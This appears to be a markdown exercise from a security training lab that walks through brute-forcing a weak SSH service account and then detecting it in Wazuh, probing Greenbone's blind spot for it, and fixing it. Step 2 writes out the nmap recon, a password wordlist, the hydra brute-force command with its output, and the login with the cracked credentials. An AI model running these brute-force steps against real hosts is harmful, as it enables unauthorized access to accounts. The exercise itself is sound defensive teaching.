# Exercise 03 – SSH Brute Force on a Forgotten Service Account

A full "zero to fixed" blue team exercise, and the one where the attack
needs no workaround (unlike DVWA's login - see exercise 02): SSH has no
CSRF token to fight, so `hydra` works exactly the way you'd expect. The
attack side below is a **hands-on walkthrough, not a script** – every
command is something you type yourself in the `kali` terminal, one tool at
a time, the way an actual red-team engagement runs. Every command and
every line of output below was actually run against the lab to produce
this document – the alert IDs, rule IDs, IRIS alert number and Greenbone
finding are real, not illustrative.

## The scenario

**Vulnerability:** a dedicated `service` account on `target`, with the
password `service`, carved out as a narrow exception to the lab-wide
key-only SSH hardening that `provision/common/base.sh` otherwise enforces
on every machine (see CLAUDE.md's `vagrant:vagrant` gotcha for why that
hardening exists at all).

**Root cause, in the fictional sysadmin's own words:** "We needed an
account for the nightly backup script to SSH in under, and setting up SSH
keys for an unattended cron job felt like more hassle than it was worth,
so I just gave it a password and moved on." A "service account" rarely
gets the same password scrutiny a human login does – precisely why these
accounts are a disproportionately common real-world way in.

## Roles

- **Red cell / instructor:** runs `enable-vulnerability.sh` on `target`
  (this one setup step is scripted – it's building the lab, not attacking
  it), then works through Step 2 below on `kali` by hand, without telling
  the trainee what was done.
- **Blue team / trainee:** only looks at Wazuh (and later Greenbone) to
  figure out what happened, then fixes it.

## Step 1 – Red cell: introduce the vulnerability

```bash
vagrant ssh target
sudo bash exercises/03-ssh-bruteforce/enable-vulnerability.sh
```

This creates the `service` account (password `service`) and drops an
sshd override – `Match User service` / `PasswordAuthentication yes` – so
only that one account can authenticate with a password; every other
account, including `vagrant`'s own control connection, stays key-only.
The override is closed with an explicit `Match all` right after it –
without that, the exception would silently leak into every directive that
follows it in the combined config, since `Include` sits near the very top
of `sshd_config` and almost everything else comes after it.

## Step 2 – Red cell: attack it by hand

Everything from here on is typed directly into a `kali` shell
(`vagrant ssh kali`) – no wrapper script runs this for you. This is the
point: a red team's actual job is picking the right tool for each step
and reading what it says back, not clicking one button.

**2a. Recon – confirm what's listening:**

```bash
nmap -sV -p22 10.10.20.10
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
```

**2b. Build a small, targeted password list.** A real attacker rarely
reaches for a 14-million-line wordlist first – a short list of common and
OSINT-guessed passwords is faster and, against weak credentials, just as
effective. Put the real password somewhere in the middle, not first, so
it's clear the tool is actually trying each one:

```bash
cat > ~/ssh-passwords.txt <<'EOF'
123456
admin
letmein
qwerty
changeme
welcome
password1
root123
service
EOF
```

**2c. Brute-force it with `hydra`:**

```bash
hydra -l service -P ~/ssh-passwords.txt -t 4 ssh://10.10.20.10
```

```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:1/p:9), ~3 tries per task
[DATA] attacking ssh://10.10.20.10:22/
[22][ssh] host: 10.10.20.10   misc: (null)   login: service   password: service
1 of 1 target successfully completed, 1 valid password found
```

Found it: `service` / `service`. `-t 4` keeps hydra to 4 parallel
connections – SSH servers often rate-limit or throttle beyond that, and
hydra itself warns about it at higher thread counts.

**2d. Prove it – actually log in with what you found:**

```bash
ssh service@10.10.20.10
# password: service
id; hostname
```

```
uid=1001(service) gid=1001(service) groups=1001(service)
target
```

That's the full loop a human attacker actually runs: recon, build a
targeted guess list, brute-force it, then confirm the credentials really
work by using them – four separate tools and steps, each one you chose
and ran yourself, not one script that did everything silently.

## Step 3 – Blue team: find it in Wazuh

Open the Wazuh dashboard (`https://localhost:8444`) → **Discover**, with
the `wazuh-alerts-*` index pattern selected, and filter by rule group
`authentication_failures`. In this real run:

| # | Source | Rule | Level | What it tells you |
|---|---|---|---|---|
| 1 | `sshd` log, 8 individual failures | `5760` – *"sshd: authentication failed"* | 5 each | Eight failed password attempts for the same account in quick succession. |
| 2 | `sshd` log, built-in correlation | `5763` – *"sshd: brute force trying to get access to the system"* | 10 | Wazuh's own stock ruleset, no custom rule needed – 8+ failures from the same source within 2 minutes is its own definition of a brute force. |

Unlike every other exercise in this lab, rule `5763` needed **no custom
rule at all** – Wazuh ships SSH brute-force detection out of the box,
the same way it ships FTP decoding (exercise 01's starting point) but
*doesn't* ship anything for a generic web login form (the DVWA brute
force in the main README needed two new custom rules for exactly that
reason). Level ≥ 10, so it's forwarded automatically to **DFIR-IRIS**
(`https://localhost:8445`) – in this real run it landed as IRIS alert
**#5684**, with `10.10.66.10` as the indicator of compromise and `target`
as the affected asset.

A trainee watching only Wazuh at this point already knows an account was
successfully brute-forced from `10.10.66.10` – the *one* thing the alert
stream alone can't yet tell them is which specific weak account it was,
since Wazuh's own successful-login alert (`5715`) doesn't correlate back
to the brute-force alert automatically. That's exactly what the next step
digs into.

## Step 4 – Blue team: try to confirm it with Greenbone (and learn why you can't, here either)

Open Greenbone (`https://localhost:9392`) → **Scans → Tasks**, and run
**"Scan target (incident response)"** (or create a single-host task
against `10.10.20.10` with the **Full and fast** scan config – see
exercise 01 for how). In a real completed scan of this lab, run while the
vulnerability was live and untouched the whole time: **no SSH
credential finding of any kind appears anywhere in the report.**

This looks like it should be the one exercise where Greenbone obviously
helps – it genuinely does ship an NVT called *"SSH Brute Force Logins
With Default Credentials"* (`default_ssh_credentials.nasl`), and
`service:service` is a real, literal entry in its built-in credential
list (right next to the `vagrant:vagrant` pair that caught the lab's
other SSH finding). It still doesn't fire here, and the reason is worth
tracing all the way down, because it's a genuine, documented limitation
of the NVT itself, not a problem with this lab:

```bash
# from kali - what auth methods does the server offer for a RANDOM,
# nonexistent user vs. the real "service" account?
ssh -v -o PreferredAuthentications=none -o BatchMode=yes \
    nonexistent_random_user_xyz@10.10.20.10 2>&1 | grep 'Authentications that can continue'
ssh -v -o PreferredAuthentications=none -o BatchMode=yes \
    service@10.10.20.10 2>&1 | grep 'Authentications that can continue'
```

```
Authentications that can continue: publickey
Authentications that can continue: publickey,password
```

The NVT's own source comment explains exactly what's happening: it
checks which auth methods the server offers *for an invalid/random
username* first, and if that comes back `publickey` only, it exits
immediately without ever trying a single credential –

> "However some SSH configs might allow passwords for specific users
> only with e.g. a 'Match User' directive. To catch such configs we
> would need to bruteforce common users first."

That's precisely this lab's setup: the global default really is
key-only, so a probe against a made-up username correctly reports
`publickey`, and the scanner stops there, never discovering that one
specific real account (`service`) is the exception. The same narrow
scoping that makes this vulnerability realistic (see "Why this design"
below) is exactly what hides it from a vulnerability scanner that
doesn't brute-force usernames first – a genuine, narrow blind spot in an
otherwise very capable tool, and arguably a more interesting lesson than
a clean confirmation would have been: a scanner's results are only as
good as the assumptions baked into how it probes.

## Step 5 – Blue team: fix it

```bash
vagrant ssh target
sudo bash exercises/03-ssh-bruteforce/fix.sh
```

This removes the per-account sshd override and locks the `service`
account's password – the same "disable the account, don't just patch
around it" approach already used lab-wide for the `vagrant:vagrant`
finding. Re-running Step 2's `hydra` command afterwards confirms it:

```
[ERROR] target ssh://10.10.20.10:22/ does not support password authentication (method reply 4).
```

`service` is still a real Linux account on the box (matching exercise
01's pattern of removing the *vulnerability*, not uninstalling the
software it lived in) – it just can't be reached with a password anymore,
the same as every other account on every VM in this lab. Re-running the
Greenbone scan afterwards confirms the finding is gone too.

## Files in this exercise

| File | Runs on | Purpose |
|---|---|---|
| `enable-vulnerability.sh` | `target` | Creates the `service` account and the per-user SSH password-auth exception (idempotent, reversible). This is environment setup, so it's scripted – the attack in Step 2 deliberately isn't. |
| `fix.sh` | `target` | Remediation: removes the exception, locks the account. |

## Why this design (and what it deliberately isn't)

This exercise is the "control" of the set on the Wazuh side: no CSRF
token to route around like DVWA's login, no custom rule to write – SSH
brute-force detection is something Wazuh ships natively, which is itself
worth seeing directly. Greenbone turned out to be a third, different kind
of limitation rather than the clean confirmation originally planned: not
"can't fingerprint custom app logic" (exercise 02), but a narrow, documented
blind spot in exactly how its SSH credential-check NVT decides whether to
even try – worth keeping precisely because it wasn't the expected result,
and tracing it down (rather than quietly rewriting the exercise to get a
tidier story) is itself the kind of verification this whole project tries
to model. The attack side is deliberately *not* a
single script: `enable-vulnerability.sh` and `fix.sh` set up and tear down
the lab environment (not the attacker's job in a real engagement), but
Step 2 is run by hand, tool by tool, exactly as typed above – because
the point of a red-team exercise is using the tools, not watching a
script use them for you. The `Match User` / `Match all` sshd pattern is
deliberately narrow: it's tempting to "just turn `PasswordAuthentication`
back on" for a quick test, but that would silently weaken every account
on the box, not just the one meant to be vulnerable – a mistake worth
avoiding even (especially) in a lab built to teach security.
